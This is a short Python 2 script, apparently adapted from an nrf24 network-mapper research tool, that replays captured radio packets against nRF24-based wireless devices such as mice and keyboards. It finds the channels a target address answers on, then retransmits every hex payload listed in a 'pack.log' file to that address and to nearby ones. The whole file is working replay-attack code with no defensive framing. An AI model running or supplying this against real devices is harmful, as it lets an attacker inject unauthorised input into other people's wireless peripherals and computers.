#!/usr/bin/env python
'''
This program is changed by nrf24-network-mapper, you can
use this script to replay packets.
'''
import binascii, time
from lib import common

# Parse command line arguments and initialize the radio
common.init_args('./nrf24-network-mapper.py')
common.parser.add_argument('-a', '--address', type=str, help='Known address', required=True)
common.parser.add_argument('-p', '--passes', type=str, help='Number of passes (default 2)', default=2)
common.parser.add_argument('-k', '--ack_timeout', type=int, help='ACK timeout in microseconds, accepts [250,4000], step 250', default=500)
common.parser.add_argument('-r', '--retries', type=int, help='Auto retry limit, accepts [0,15]', default='5', choices=xrange(0, 16), metavar='RETRIES')
common.parse_and_init()
# Parse the address
address = common.args.address.replace(':', '').decode('hex')[::-1][:5]
address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
if len(address) < 2: 
  raise Exception('Invalid address: {0}'.format(common.args.address))

# Put the radio in sniffer mode (ESB w/o auto ACKs)
common.radio.enter_sniffer_mode(address)

# Payload used for pinging the target device 
# (some nRF24 based devices don't play well with shorter payloads)

# Format the ACK timeout and auto retry values 
ack_timeout = int(common.args.ack_timeout / 250) - 1
ack_timeout = max(0, min(ack_timeout, 15))
retries = max(0, min(common.args.retries, 15))
ping_payload = '\x0F\x0F\x0F\x0F'
#click_payload ='\x01\x02\x00\x00\x03\x38'
#Ping each address on each channel args.passes number of times
#Read pack
def ReadPack():
  payload = []
  for line in  open('pack.log'):
    payload.append(line)    
  return payload

def Ping():
  channels_t = []
  valid_addresses = []
  for p in range(common.args.passes):
    for b in range(4):
      try_address = chr(b) + address[1:]
      common.radio.enter_sniffer_mode(try_address)
      for c in range(len(common.args.channels)):
        common.radio.set_channel(common.args.channels[c])
        if common.radio.transmit_payload(ping_payload, ack_timeout, retries):
          channels_t.append(common.channels[c])
  return channels_t

def airplay(sendpayload,get_channels,data):
  valid_addresses = []
  for p in range(common.args.passes):
    # Step through each potential address
    for b in range(4):
      try_address = chr(b) + address[1:]
      common.radio.enter_sniffer_mode(try_address)
      # Step through each channel
      for c in range(len(get_channels)):
        common.radio.set_channel(get_channels[c])
        # Attempt to ping the address
        if common.radio.transmit_payload(sendpayload, ack_timeout, retries):
          #valid_addresses.append(try_address)
          print 'Sending Payload:'+' '+data
#run
def run():
  get_channels=list(set(Ping()))
  payloads = ReadPack()
  for payload in payloads:
    data = payload.strip('\n')
    payload = binascii.a2b_hex(data.replace(':',''))
    airplay(payload,get_channels,data)

def main():
  run()

if __name__ == '__main__':
  main()
  
  
  
